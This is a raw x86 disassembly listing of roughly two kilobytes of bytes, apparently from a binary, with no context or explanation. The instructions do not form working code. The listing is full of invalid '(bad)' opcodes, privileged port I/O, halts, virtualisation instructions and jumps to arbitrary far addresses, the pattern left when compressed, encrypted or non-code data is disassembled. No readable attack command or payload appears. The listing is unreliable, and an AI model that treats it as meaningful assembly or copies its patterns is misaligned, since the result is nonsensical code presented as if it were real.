  414356:	fs stos BYTE PTR es:[edi],al
  414358:	xchg   ch,ah
  41435a:	cwde   
  41435b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41435c:	lods   al,BYTE PTR ds:[esi]
  41435d:	popa   
  41435e:	ret    
  41435f:	inc    ebp
  414360:	jl     0x414327
  414362:	test   DWORD PTR [ecx+0x4e7ce91f],edi
  414368:	stos   BYTE PTR es:[edi],al
  414369:	xchg   edx,eax
  41436a:	std    
  41436b:	int    0xe1
  41436d:	enter  0x6103,0xda
  414371:	enter  0x1778,0x57
  414375:	test   DWORD PTR [ebx],0x28b6b44d
  41437b:	scas   eax,DWORD PTR es:[edi]
  41437c:	popf   
  41437d:	push   ds
  41437e:	push   cs
  41437f:	pushf  
  414380:	cmp    ebp,DWORD PTR [esi-0xc]
  414383:	jl     0x41437a
  414385:	lahf   
  414386:	int3   
  414387:	in     al,dx
  414388:	pushf  
  414389:	ret    0x1fb7
  41438c:	(bad)  
  41438d:	std    
  41438e:	pusha  
  41438f:	and    BYTE PTR [eax+0x31363771],bh
  414395:	dec    edx
  414396:	jle    0x414334
  414398:	pop    eax
  414399:	loop   0x41439b
  41439b:	retf   0xc7cf
  41439e:	hlt    
  41439f:	(bad)  
  4143a0:	retf   0x14ad
  4143a3:	and    al,0x7d
  4143a5:	std    
  4143a6:	daa    
  4143a7:	fld    TBYTE PTR [ebp+edx*8+0x1ece77cf]
  4143ae:	mov    cl,0x85
  4143b0:	out    dx,eax
  4143b1:	rcl    ah,1
  4143b3:	fist   DWORD PTR [ebp+ecx*2-0x2cb7fe44]
  4143ba:	adc    cx,WORD PTR [ebp+edx*1+0x2baf6f63]
  4143c2:	push   edi
  4143c3:	arpl   si,di
  4143c5:	loopne 0x41435c
  4143c7:	xchg   edx,eax
  4143c8:	daa    
  4143c9:	inc    eax
  4143ca:	mov    WORD PTR [eax+0x2],es
  4143cd:	inc    esi
  4143ce:	mov    ch,0x5e
  4143d0:	xchg   esp,eax
  4143d1:	outs   dx,DWORD PTR ds:[esi]
  4143d2:	jns    0x414406
  4143d4:	xchg   esp,eax
  4143d5:	mov    ds:0x1af8a0e1,al
  4143da:	out    dx,eax
  4143db:	push   ecx
  4143dc:	jnp    0x414415
  4143de:	xor    esi,DWORD PTR [esi]
  4143e0:	fild   QWORD PTR [ecx+0x47]
  4143e3:	sub    dl,ah
  4143e5:	(bad)  
  4143e6:	mov    edi,0x8029001c
  4143eb:	mov    edx,0xfeebb28c
  4143f0:	outs   dx,BYTE PTR ds:[esi]
  4143f1:	mul    BYTE PTR [edi]
  4143f3:	test   DWORD PTR [ecx-0x5a],0x914cfff8
  4143fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143fb:	fwait
  4143fc:	mov    DWORD PTR [esi+0x37],esp
  4143ff:	(bad)  [eax]
  414401:	xchg   edi,eax
  414402:	xchg   ebx,eax
  414403:	mov    ch,0x60
  414405:	sbb    edx,DWORD PTR [edx-0x6d07f497]
  41440b:	adc    ecx,DWORD PTR [esi+ecx*2-0x4]
  41440f:	inc    eax
  414410:	lahf   
  414411:	fs aas 
  414413:	fwait
  414414:	dec    esi
  414415:	rcr    DWORD PTR [edx+edx*1],0xa5
  414419:	imul   edi,DWORD PTR [ecx-0x64],0xffffffe3
  41441d:	sbb    DWORD PTR [eax],eax
  41441f:	xsha1  (bad)
  414420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414421:	int3   
  414422:	xchg   esp,eax
  414423:	shl    DWORD PTR [eax+0x3],0x9c
  414427:	pop    es
  414428:	jmp    0x3fb7:0x13aef134
  41442f:	adc    DWORD PTR [eax+0x1e239733],0x6c
  414436:	push   0x57
  414438:	sahf   
  414439:	cmp    DWORD PTR [ecx+edx*2],edx
  41443c:	dec    ecx
  41443d:	daa    
  41443e:	push   ss
  41443f:	xrelease mov BYTE PTR [ebx],ah
  414442:	sbb    al,0xe0
  414444:	lock push ecx
  414446:	push   eax
  414447:	cmp    al,0x6d
  414449:	sahf   
  41444a:	pusha  
  41444b:	and    al,BYTE PTR [ecx+0x20839485]
  414451:	mov    al,ds:0xdf1f52b
  414456:	xlat   BYTE PTR ds:[ebx]
  414457:	outs   dx,BYTE PTR ds:[esi]
  414458:	or     DWORD PTR [ebx],esp
  41445a:	inc    edi
  41445b:	ins    DWORD PTR es:[edi],dx
  41445c:	test   eax,0xd8e96c67
  414461:	das    
  414462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414463:	iret   
  414464:	hlt    
  414465:	je     0x414458
  414467:	jb     0x4144ba
  414469:	std    
  41446a:	outs   dx,BYTE PTR ds:[esi]
  41446b:	mov    DWORD PTR [edi-0x61],edi
  41446e:	or     esp,DWORD PTR [edx]
  414470:	jno    0x414421
  414472:	daa    
  414473:	adc    eax,ecx
  414475:	fwait
  414476:	push   ebx
  414477:	pushf  
  414478:	out    dx,al
  414479:	lds    eax,FWORD PTR [ebx+0x752c03ec]
  41447f:	and    BYTE PTR [eax-0x5],0x96
  414483:	pop    edi
  414484:	aas    
  414485:	es jl  0x4144f0
  414488:	and    dl,BYTE PTR [ebx]
  41448a:	add    ebp,DWORD PTR [ecx-0x20]
  41448d:	inc    ebx
  41448e:	xor    edx,DWORD PTR [ebx]
  414490:	out    dx,eax
  414491:	fdiv   QWORD PTR [ebx-0x43]
  414494:	add    dl,BYTE PTR ds:0x695dc031
  41449a:	adc    DWORD PTR [edx-0x2e8ab4c4],ebx
  4144a0:	leave  
  4144a1:	and    BYTE PTR [eax+0x4a9072c7],cl
  4144a7:	imul   esp,DWORD PTR [edx-0x5d],0xffffff83
  4144ab:	je     0x414442
  4144ad:	adc    cl,cl
  4144af:	das    
  4144b0:	mov    edi,0xbe9acc64
  4144b5:	dec    eax
  4144b6:	adc    al,0xd6
  4144b8:	push   esi
  4144b9:	jbe    0x414470
  4144bb:	cmp    BYTE PTR [eax],bl
  4144bd:	int    0x82
  4144bf:	in     eax,0x74
  4144c1:	pop    eax
  4144c2:	lods   eax,DWORD PTR ds:[esi]
  4144c3:	into   
  4144c4:	pop    ecx
  4144c5:	and    al,0xb
  4144c7:	sub    eax,0xce51d95a
  4144cc:	pop    esp
  4144cd:	and    bh,BYTE PTR [edx-0x3f]
  4144d0:	(bad)  
  4144d1:	pop    esp
  4144d2:	into   
  4144d3:	push   ebx
  4144d4:	dec    ecx
  4144d5:	sbb    ebp,DWORD PTR [ebp-0x32]
  4144d8:	out    dx,eax
  4144d9:	add    BYTE PTR ds:0x3e4f902,0x6
  4144e0:	pop    ds
  4144e1:	sbb    DWORD PTR [edi],edx
  4144e3:	add    esp,DWORD PTR [ebx+0x33]
  4144e6:	and    ebx,DWORD PTR [eax]
  4144e8:	add    esi,edx
  4144ea:	jne    0x41456a
  4144ec:	ds push 0x6cf33fa
  4144f2:	xchg   esp,eax
  4144f3:	retf   
  4144f4:	rol    WORD PTR [ebx+0x3f149c69],0x60
  4144fc:	mov    esp,0xed2ef66
  414501:	aaa    
  414502:	pop    eax
  414503:	(bad)  
  414504:	stos   DWORD PTR es:[edi],eax
  414505:	je     0x4144a0
  414507:	push   eax
  414508:	repz push eax
  41450a:	ins    DWORD PTR es:[edi],dx
  41450b:	inc    edx
  41450c:	mov    edx,0x47a5dba8
  414511:	push   0x69
  414513:	imul   ecx,DWORD PTR [ecx-0x161b4556],0x60a694ca
  41451d:	int    0x93
  41451f:	in     eax,dx
  414520:	and    dh,BYTE PTR [esi-0x5ae93f77]
  414526:	jmp    0x4145a6
  414528:	pop    edi
  414529:	xchg   ecx,eax
  41452a:	add    DWORD PTR [eax],ebx
  41452c:	ror    DWORD PTR [edi],1
  41452e:	loope  0x41459e
  414530:	mov    cs,WORD PTR [ecx]
  414532:	cld    
  414533:	mov    eax,0x591423ae
  414538:	out    0xcd,al
  41453a:	out    0x55,eax
  41453c:	test   al,0xda
  41453e:	retf   0xe542
  414541:	or     BYTE PTR [ebp-0x70fd862],bl
  414547:	xchg   ecx,eax
  414548:	aad    0x28
  41454a:	push   cs
  41454b:	stc    
  41454c:	mov    ds:0x604dc9ee,eax
  414551:	pop    edi
  414552:	sub    eax,0xfe6fa136
  414557:	mov    ds:0x3d257fd9,al
  41455c:	cmp    cl,BYTE PTR [eax+0x1ab2a07c]
  414562:	aas    
  414563:	push   DWORD PTR [ebp+0x56]
  414566:	sub    eax,0x43dbd3d9
  41456b:	gs pop edi
  41456d:	jmp    0x414559
  41456f:	xchg   edx,eax
  414570:	call   0xe01dee6a
  414575:	xlat   BYTE PTR ds:[ebx]
  414576:	out    dx,al
  414577:	outs   dx,BYTE PTR ds:[esi]
  414578:	cwde   
  414579:	shl    DWORD PTR [edi-0x76acb8b7],0x37
  414580:	cld    
  414581:	mov    ch,0x42
  414583:	cmp    esi,esp
  414585:	cld    
  414586:	dec    esp
  414587:	add    al,0x6f
  414589:	fdivr  st(6),st
  41458b:	cmp    BYTE PTR [eax],al
  41458d:	test   DWORD PTR [edx+0x92a662b],esi
  414593:	shl    al,1
  414595:	adc    al,0x74
  414597:	ret    
  414598:	bound  ebx,QWORD PTR [ebx]
  41459a:	push   ecx
  41459b:	adc    cl,BYTE PTR [eax+0x5a]
  41459e:	(bad)  [ebx-0x4775e653]
  4145a4:	fist   WORD PTR [edx]
  4145a6:	xchg   edx,eax
  4145a7:	or     ebp,ebx
  4145a9:	pop    es
  4145aa:	adc    DWORD PTR [eax-0x36],edi
  4145ad:	mov    BYTE PTR [eax-0x5506ba11],bh
  4145b3:	add    BYTE PTR [ebx],cl
  4145b5:	cmp    eax,0x50158d38
  4145ba:	test   BYTE PTR [ebp-0x60],al
  4145bd:	scas   eax,DWORD PTR es:[edi]
  4145be:	test   esp,edi
  4145c0:	leave  
  4145c1:	out    dx,eax
  4145c2:	stc    
  4145c3:	les    esi,FWORD PTR [edi+0x41126fe9]
  4145c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145ca:	(bad)  
  4145cb:	mov    cl,0xe7
  4145cd:	mov    bh,0x9
  4145cf:	in     al,dx
  4145d0:	cld    
  4145d1:	push   0x89238e07
  4145d6:	xlat   BYTE PTR ds:[ebx]
  4145d7:	sub    BYTE PTR [edx+0x53fe0c6e],0x81
  4145de:	mov    cl,0x41
  4145e0:	sub    al,0x58
  4145e2:	test   DWORD PTR [ebx-0x49543913],esi
  4145e8:	js     0x41456b
  4145ea:	or     dh,BYTE PTR [edx-0x2dcabae4]
  4145f0:	(bad)  
  4145f1:	xchg   ecx,eax
  4145f2:	adc    BYTE PTR [ebx],bh
  4145f4:	xchg   ebx,eax
  4145f5:	sbb    al,0x10
  4145f7:	inc    esp
  4145f8:	jge    0x414594
  4145fa:	sbb    ebp,esp
  4145fc:	and    al,0x23
  4145fe:	jmp    0xb7ce:0xe053e40b
  414605:	mov    ds:0xd61f37f5,eax
  41460a:	outs   dx,BYTE PTR ds:[esi]
  41460b:	pop    ss
  41460c:	jb     0x414593
  41460e:	fild   QWORD PTR [edi-0x58053d0c]
  414614:	jae    0x414654
  414616:	cmc    
  414617:	test   BYTE PTR [edi],0xd4
  41461a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41461b:	cmp    eax,0x57a4145f
  414620:	lock jecxz 0x41465c
  414623:	(bad)  
  414625:	jo     0x414692
  414627:	dec    eax
  414628:	xor    BYTE PTR [edi+edx*2],dh
  41462b:	push   eax
  41462c:	sub    esp,DWORD PTR [edi]
  41462e:	dec    esp
  41462f:	shl    BYTE PTR [eax+esi*1-0x2d],1
  414633:	dec    edx
  414634:	xor    bl,dl
  414636:	cmp    esi,ebx
  414638:	mov    ch,0xb5
  41463a:	sub    bh,BYTE PTR [ecx+ecx*1]
  41463d:	dec    ebx
  41463e:	scas   eax,DWORD PTR es:[edi]
  41463f:	mov    ch,0xf6
  414641:	fisubr WORD PTR [esi-0x55]
  414644:	pop    ebx
  414645:	ins    BYTE PTR es:[edi],dx
  414646:	mov    eax,0x472004fd
  41464b:	jle    0x4146a6
  41464d:	aad    0xd6
  41464f:	retf   0xe4b3
  414652:	loope  0x4146aa
  414654:	cwde   
  414655:	scas   al,BYTE PTR es:[edi]
  414656:	mov    al,ds:0x38ac269f
  41465b:	jg     0x41463f
  41465d:	gs ds out 0x7,al
  414661:	scas   al,BYTE PTR es:[edi]
  414662:	or     al,0xee
  414664:	daa    
  414665:	fnstcw WORD PTR [ecx+0x2bc83729]
  41466b:	dec    ecx
  41466c:	sub    al,0x7f
  41466e:	sub    bh,BYTE PTR [eax]
  414670:	push   ebx
  414671:	pop    ds
  414672:	nop
  414673:	and    BYTE PTR [esi],dh
  414675:	iret   
  414676:	ret    0x87c5
  414679:	and    edx,0xffffffbc
  41467c:	push   ds
  41467d:	pop    ecx
  41467e:	mov    al,0x6b
  414680:	call   0x34ee2d51
  414685:	ror    BYTE PTR [ebp-0x2f],1
  414688:	call   0x4ba1:0xa91e65ca
  41468f:	push   edi
  414690:	out    0x2d,eax
  414692:	pop    ss
  414693:	dec    edx
  414694:	(bad)  
  414695:	mov    edi,0xf7cf2180
  41469a:	sub    edx,esi
  41469c:	leave  
  41469d:	push   0x40df234b
  4146a2:	(bad)  
  4146a3:	pop    ebp
  4146a4:	rcr    BYTE PTR [edx-0x26],1
  4146a7:	fisubr DWORD PTR [ebp+ebx*8+0xa]
  4146ab:	mov    al,ds:0xbd1beefc
  4146b0:	test   eax,0x5dcfe740
  4146b5:	pop    edx
  4146b6:	sub    BYTE PTR [eax+0x41],bl
  4146b9:	mov    ah,0x50
  4146bb:	(bad)  
  4146bc:	out    dx,eax
  4146bd:	mov    ebx,0x19ed576d
  4146c2:	pop    esi
  4146c3:	mov    eax,0x28cea2a0
  4146c8:	inc    edi
  4146c9:	sbb    eax,DWORD PTR [ebp-0x1a]
  4146cc:	aad    0x74
  4146ce:	or     edi,ecx
  4146d0:	rcl    DWORD PTR [ebx+0x22],cl
  4146d3:	aad    0xf3
  4146d5:	test   al,0x2
  4146d7:	and    eax,0x10f6371d
  4146dc:	int3   
  4146dd:	cmp    dl,cl
  4146df:	xchg   esp,ebx
  4146e1:	xor    eax,ecx
  4146e3:	xchg   DWORD PTR [edi-0x22],esp
  4146e6:	call   0x1864:0xbd488fa6
  4146ed:	rcl    BYTE PTR [edi],1
  4146ef:	loop   0x4146af
  4146f1:	or     edx,esp
  4146f3:	out    0x64,al
  4146f5:	cmp    al,0xa4
  4146f7:	mov    WORD PTR [edi],?
  4146f9:	or     BYTE PTR [edx-0x599ed9a1],al
  4146ff:	sar    bl,0x73
  414702:	dec    edi
  414703:	xchg   edi,eax
  414704:	ret    
  414705:	js     0x4146d0
  414707:	dec    ebp
  414708:	xor    DWORD PTR [edi-0x36bbb89b],edi
  41470e:	int3   
  41470f:	pop    ds
  414710:	adc    ch,dl
  414712:	xchg   ebp,eax
  414713:	ret    
  414714:	out    dx,al
  414715:	push   eax
  414716:	or     al,0x7b
  414718:	sub    DWORD PTR cs:[ecx+0x3f9e948],ecx
  41471f:	push   esp
  414720:	(bad)  
  414721:	mov    bl,0xef
  414723:	stos   BYTE PTR es:[edi],al
  414724:	mov    ah,0x87
  414726:	fpatan 
  414728:	ret    
  414729:	dec    ebx
  41472a:	xor    DWORD PTR [edi],ebx
  41472c:	pushf  
  41472d:	lock fdiv st(5),st
  414730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414731:	imul   eax,DWORD PTR [ecx],0xf32ea7e0
  414737:	call   0xb3c2:0x8de7c077
  41473e:	idiv   BYTE PTR [eax]
  414740:	sbb    dh,BYTE PTR [esi-0x5c]
  414743:	cli    
  414744:	jmp    0x414760
  414746:	push   ebx
  414747:	sbb    eax,0x8b12f8a7
  41474c:	pop    ds
  41474d:	pop    ds
  41474e:	rcl    DWORD PTR [edx+0x66],0x5d
  414752:	into   
  414753:	fwait
  414754:	mov    edi,0xfe8fbc6a
  414759:	xchg   ebx,eax
  41475a:	xor    al,BYTE PTR [ecx+0x58]
  41475d:	iret   
  41475e:	sub    BYTE PTR [edx-0x1f8e4157],0xa8
  414765:	xor    al,0xa5
  414767:	leave  
  414768:	dec    ebp
  414769:	lea    edx,[ebp-0x32bc8ae1]
  41476f:	inc    ecx
  414770:	js     0x414703
  414772:	(bad)  
  414773:	mov    al,ds:0x7c64d7d4
  414778:	add    al,0x30
  41477a:	push   esp
  41477b:	dec    esp
  41477c:	pop    ecx
  41477d:	push   edi
  41477e:	add    al,ch
  414780:	add    DWORD PTR ds:0x293394b4,esp
  414786:	sahf   
  414787:	out    dx,eax
  414788:	mov    ebx,0xdbeb716a
  41478d:	je     0x4147de
  41478f:	xchg   edx,eax
  414790:	(bad)  
  414791:	(bad)  
  414793:	(bad)  
  414794:	int3   
  414795:	jp     0x414734
  414797:	imul   eax,DWORD PTR [eax+edx*4-0x22336eb3],0xc1b123d4
  4147a2:	inc    eax
  4147a3:	mov    ebx,0xf2c23907
  4147a8:	dec    esp
  4147a9:	jnp    0x41479e
  4147ab:	fcmovbe st,st(1)
  4147ad:	stos   BYTE PTR es:[edi],al
  4147ae:	and    eax,0x3e34b2a3
  4147b3:	mov    ds:0x83152488,eax
  4147b8:	out    dx,al
  4147b9:	sub    BYTE PTR [edx],bh
  4147bb:	cld    
  4147bc:	data16 loop 0x4147c7
  4147bf:	cmp    edi,esp
  4147c1:	shl    DWORD PTR [ecx],1
  4147c3:	retf   0xdf5a
  4147c6:	fdivr  DWORD PTR [ebx-0x490b3c81]
  4147cc:	xchg   BYTE PTR [eax+eiz*4+0xbfffee2],bl
  4147d3:	cli    
  4147d4:	adc    al,0xb6
  4147d6:	or     BYTE PTR [ecx],0xfa
  4147d9:	ja     0x4147a2
  4147db:	cld    
  4147dc:	pop    ecx
  4147dd:	sub    DWORD PTR [esp+ebp*8-0x16],esp
  4147e1:	mov    bl,0x55
  4147e3:	sti    
  4147e4:	mov    esi,0x54294b4d
  4147e9:	retf   
  4147ea:	and    al,0x2d
  4147ec:	cmp    al,0x69
  4147ee:	dec    ecx
  4147ef:	cli    
  4147f0:	cli    
  4147f1:	call   0x2978433c
  4147f6:	jle    0x414821
  4147f8:	(bad)  
  4147f9:	mov    al,0x5f
  4147fb:	inc    edi
  4147fc:	retf   0x3145
  4147ff:	cmp    al,0x83
  414801:	packuswb mm4,QWORD PTR [ebp-0x138e5353]
  414808:	inc    esp
  414809:	pop    ebp
  41480a:	mov    ebx,0xf47e78a9
  41480f:	stos   DWORD PTR es:[edi],eax
  414810:	mov    DWORD PTR [esi],0xb4209306
  414816:	cwde   
  414817:	les    eax,FWORD PTR [edx-0x57]
  41481a:	scas   al,BYTE PTR es:[edi]
  41481b:	sahf   
  41481c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41481d:	cwde   
  41481e:	and    eax,0xd23b4be
  414823:	jbe    0x414898
  414825:	bound  edx,QWORD PTR [edi+edx*2]
  414828:	(bad)  
  41482a:	jmp    0x606f88e5
  41482f:	add    eax,0x78c49786
  414834:	clc    
  414835:	push   ebp
  414836:	jnp    0x4147cd
  414838:	inc    BYTE PTR [ebx]
  41483a:	push   ds
  41483b:	mov    edi,0x60577932
  414840:	fld    TBYTE PTR [ecx]
  414842:	inc    ecx
  414843:	adc    ch,BYTE PTR [eax-0x2f7d723e]
  414849:	adc    bh,BYTE PTR [ecx+0x6d]
  41484c:	cwde   
  41484d:	lahf   
  41484e:	outs   dx,BYTE PTR ds:[esi]
  41484f:	(bad)  
  414850:	push   ebp
  414851:	push   esp
  414852:	jl     0x41488e
  414854:	arpl   WORD PTR [eax],si
  414856:	lea    edi,[eax+ebp*8+0x31147cc7]
  41485d:	in     al,0x13
  41485f:	aad    0xf0
  414861:	xchg   ebx,eax
  414862:	test   BYTE PTR [esi+0x6bf3aa82],al
  414868:	add    DWORD PTR [esi+eiz*1-0x7b],esp
  41486c:	(bad)  
  41486d:	adc    eax,0xc66797ba
  414872:	das    
  414873:	cld    
  414874:	mov    eax,0xaed9516e
  414879:	shl    DWORD PTR ds:0x49b4ac8f,cl
  41487f:	aad    0x81
  414881:	mov    ecx,DWORD PTR [edi-0xe]
  414884:	inc    ebp
  414885:	cmc    
  414886:	stc    
  414887:	js     0x4148d3
  414889:	std    
  41488a:	inc    ecx
  41488b:	xor    DWORD PTR [ebp+0x4a],0xe
  41488f:	mov    ds:0xe194ded,eax
  414894:	push   esi
  414895:	jmp    0x730f9781
  41489a:	sub    BYTE PTR [edi+0x9],0xfb
  41489e:	clc    
  41489f:	mov    esi,0xe24e982d
  4148a4:	push   cs
  4148a5:	ret    0xcc8b
  4148a8:	push   edx
  4148a9:	add    BYTE PTR [eax+0xdc3a57a],bl
  4148af:	test   DWORD PTR [ebx],0xee7f2186
  4148b5:	sbb    DWORD PTR [esi+ebx*2+0x67207e33],esp
  4148bc:	cmp    al,BYTE PTR [ecx-0x3b1266ec]
  4148c2:	fld    TBYTE PTR [edi+edi*8-0x2a]
  4148c6:	test   DWORD PTR [esi-0x2a71f9b3],edi
  4148cc:	stc    
  4148cd:	sub    ch,ah
  4148cf:	call   0xd944:0x51548168
  4148d6:	jo     0x414894
  4148d8:	inc    esi
  4148d9:	dec    edi
  4148da:	stos   BYTE PTR es:[edi],al
  4148db:	test   edx,eax
  4148dd:	pop    ds
  4148de:	jecxz  0x4148ca
  4148e0:	pop    edx
  4148e1:	iret   
  4148e2:	sub    esp,eax
  4148e4:	xchg   DWORD PTR [edx],eax
  4148e6:	xor    eax,0x1cbfda97
  4148eb:	add    dl,BYTE PTR [ebp+eax*4+0x6e]
  4148ef:	or     ebp,0x1f
  4148f2:	xchg   edi,eax
  4148f3:	sub    eax,0x8943d70
  4148f8:	pop    ecx
  4148f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148fa:	mov    dh,0x2a
  4148fc:	(bad)  
  4148fd:	mov    dh,0x17
  4148ff:	inc    esp
  414900:	(bad)  
  414901:	shr    BYTE PTR [edx+ecx*8-0x41],0x5e
  414906:	or     BYTE PTR [edx+0x2c44642c],0x97
  41490d:	adc    dl,BYTE PTR [esi+ebp*8+0x665d6fb7]
  414914:	out    0x8c,eax
  414916:	or     BYTE PTR [edx],0xbf
  414919:	ffree  st(6)
  41491b:	test   eax,0xabefd3dd
  414920:	repz push esi
  414922:	call   DWORD PTR [ecx]
  414924:	add    BYTE PTR [ecx+0x5c315cfa],dh
  41492a:	rol    BYTE PTR [edx+0x1e],cl
  41492d:	ds mov edi,0x925bdb4b
  414933:	rol    BYTE PTR [edi-0x52],0xb7
  414937:	jmp    0x4149a5
  414939:	mov    ds:0xfab6f1ca,al
  41493e:	ror    BYTE PTR [ecx+0x56],0xe3
  414942:	lock jmp 0x3e9e:0xc19e8487
  41494a:	xor    eax,esp
  41494c:	retf   0x6d4b
  41494f:	sbb    BYTE PTR [eax-0x208029dc],bh
  414955:	out    0x59,eax
  414957:	adc    eax,0x7886fae
  41495c:	lahf   
  41495d:	in     eax,dx
  41495e:	mov    bl,0xb3
  414960:	mov    esi,0x825303c1
  414965:	and    al,0x98
  414967:	idiv   DWORD PTR [eax]
  414969:	xor    dh,BYTE PTR [ecx-0x60]
  41496c:	repnz in al,dx
  41496e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41496f:	push   edx
  414970:	je     0x4149df
  414972:	adc    BYTE PTR [ebx+eax*8+0x76],bh
  414976:	jmp    0xf490548e
  41497b:	inc    ebp
  41497c:	push   ecx
  41497d:	lods   eax,DWORD PTR ds:[esi]
  41497e:	dec    edi
  41497f:	add    DWORD PTR [eax+0x52],0xffffffe0
  414983:	ret    
  414984:	es out dx,al
  414986:	push   0xef5c1837
  41498b:	mov    ebp,0x5d7aac59
  414990:	or     dh,dh
  414992:	or     cl,BYTE PTR [esi]
  414994:	out    dx,al
  414995:	xchg   DWORD PTR [ebx+0x60],ebp
  414998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414999:	inc    ebx
  41499a:	dec    esi
  41499b:	bound  edi,QWORD PTR [esp+edi*8-0x4779d9dc]
  4149a2:	mov    cl,0x83
  4149a4:	(bad)  
  4149a5:	adc    al,0xc3
  4149a7:	or     ebp,edi
  4149a9:	les    esp,FWORD PTR [edx+0x49]
  4149ac:	jmp    FWORD PTR [esi-0x52fdca64]
  4149b2:	pop    edx
  4149b3:	test   eax,ecx
  4149b5:	push   ds
  4149b6:	push   esi
  4149b7:	call   0xe3cf7c64
  4149bc:	push   esi
  4149bd:	fs jb  0x414a21
  4149c0:	ds out dx,eax
  4149c2:	aaa    
  4149c3:	not    DWORD PTR [esi-0x741e46e6]
  4149c9:	mov    DWORD PTR [eax-0x22],eax
  4149cc:	pop    esi
  4149cd:	sbb    DWORD PTR [esp+eax*1-0x71af336a],esp
  4149d4:	mov    ch,BYTE PTR [edx-0x17d41324]
  4149da:	and    esi,DWORD PTR [edx+0x2]
  4149dd:	and    eax,0x1cdab03
  4149e2:	inc    ebx
  4149e3:	mov    al,0x6b
  4149e5:	out    dx,al
  4149e6:	mov    edx,0xef55c8d6
  4149eb:	mov    ds:0x2928be57,eax
  4149f0:	jns    0x414a60
  4149f2:	mov    ebx,0x7d0ed5a2
  4149f7:	shl    al,0xd1
  4149fa:	sub    ecx,DWORD PTR [ecx-0x33]
  4149fd:	mov    bh,dh
  4149ff:	cmp    al,0xc8
  414a01:	sar    DWORD PTR [edx],0x35
  414a04:	cmp    DWORD PTR [edx-0x6fd1a72f],esp
  414a0a:	inc    esp
  414a0b:	clc    
  414a0c:	vmread DWORD PTR [ecx-0xca44525],eax
  414a13:	push   ebx
  414a14:	dec    esp
  414a15:	add    ch,0x88
  414a18:	sub    bl,BYTE PTR [edx+0x50c3c61e]
  414a1e:	push   cs
  414a1f:	xchg   esi,eax
  414a20:	or     BYTE PTR [ebx-0x46],cl
  414a23:	push   eax
  414a24:	sti    
  414a25:	add    al,0x50
  414a27:	shl    DWORD PTR [eax],cl
  414a29:	mov    al,0xa7
  414a2b:	cmc    
  414a2c:	xchg   ebx,eax
  414a2d:	jno    0x414a45
  414a2f:	out    dx,al
  414a30:	xchg   ecx,eax
  414a31:	fisubr WORD PTR [ecx]
  414a33:	fcom   st(4)
  414a35:	sti    
  414a36:	mov    ds,ebx
  414a38:	mov    eax,ds:0x425fcc4
  414a3d:	shl    DWORD PTR [edi+eax*1+0x7d],0x7e
  414a42:	cmp    al,0x15
  414a44:	mov    ebx,DWORD PTR [ebx]
  414a46:	pop    ebp
  414a47:	sbb    DWORD PTR [edx-0x71],edx
  414a4a:	pusha  
  414a4b:	mov    eax,0x9a8ca756
  414a50:	aaa    
  414a51:	mov    edi,0xc6516451
  414a56:	fs leave 
  414a58:	sahf   
  414a59:	sub    ch,BYTE PTR [edi+ecx*2+0x6ebd4cd]
  414a60:	outs   dx,BYTE PTR ds:[esi]
  414a61:	ds pop esi
  414a63:	push   es
  414a64:	push   cs
  414a65:	cld    
  414a66:	in     eax,0x7d
  414a68:	push   ss
  414a69:	ja     0x414a76
  414a6b:	into   
  414a6c:	repz and al,0x1a
  414a6f:	add    dh,bl
  414a71:	jecxz  0x4149f5
  414a73:	add    bl,BYTE PTR [ebx]
  414a75:	sub    ebp,DWORD PTR [esi+ebp*4+0xe]
  414a79:	mov    ds:0xacabdf06,al
  414a7e:	fwait
  414a7f:	mov    esi,edi
  414a81:	jo     0x414a22
  414a83:	jecxz  0x414a96
  414a85:	lea    ecx,[edi+0x46]
  414a88:	in     eax,0x4c
  414a8a:	sub    eax,0x51e992e3
  414a8f:	lock idiv edi
  414a92:	ds push es
  414a94:	jo     0x414ae0
  414a96:	lock adc eax,0xd85de58c
  414a9c:	jge    0x414afb
  414a9e:	mov    esp,0xe249b4f6
  414aa3:	cld    
  414aa4:	sub    cl,BYTE PTR [edx]
  414aa6:	sbb    esp,ebx
  414aa8:	and    esi,DWORD PTR [eax]
  414aaa:	shl    al,cl
  414aac:	fild   WORD PTR [eax-0x5392539c]
  414ab2:	xor    al,0x9d
  414ab4:	nop
  414ab5:	and    esi,DWORD PTR [edi+0x58e85ba8]
  414abb:	push   esi
  414abc:	(bad)  
  414abd:	push   edx
  414abe:	cmp    cl,BYTE PTR [ecx]
  414ac0:	jo     0x414a8e
  414ac2:	push   edx
  414ac3:	or     BYTE PTR ds:0xbf102a56,ch
  414ac9:	fadd   DWORD PTR [edi-0x1cf28955]
  414acf:	gs xchg ebx,eax
  414ad1:	mov    esp,DWORD PTR [ecx+0x1a]
  414ad4:	ins    BYTE PTR es:[edi],dx
  414ad5:	inc    esp
  414ad6:	ins    DWORD PTR es:[edi],dx
  414ad7:	dec    edx
  414ad8:	jecxz  0x414b55
  414ada:	shl    DWORD PTR [edi+ebx*4],1
  414add:	and    DWORD PTR [esp+edi*2-0x684d764e],esi
  414ae4:	dec    edi
  414ae5:	jno    0x414b2f
  414ae7:	aas    
  414ae8:	jo     0x414af8
  414aea:	push   edi
  414aeb:	xchg   edi,eax
  414aec:	inc    ecx
  414aed:	jl     0x414ade
  414aef:	push   cs
  414af0:	fstp   QWORD PTR [ebp+0x48efcfe9]
  414af6:	sub    ch,BYTE PTR [ebp-0x4f]
  414af9:	and    al,0x6a
  414afb:	or     al,0xcb
  414afd:	and    al,0xfb
  414aff:	mov    ss,WORD PTR [ebp+0x5fd0bfd8]
  414b05:	sub    eax,0xf18493b4
  414b0a:	xor    eax,0xb10ec955
  414b0f:	add    esp,DWORD PTR [ebp-0x62]
  414b12:	ins    BYTE PTR es:[edi],dx
  414b13:	stos   BYTE PTR es:[edi],al
  414b14:	in     eax,dx
  414b15:	jle    0x414b4a
  414b17:	cli    
  414b18:	std    
  414b19:	test   ecx,ecx
  414b1b:	pop    ecx
  414b1c:	push   ds
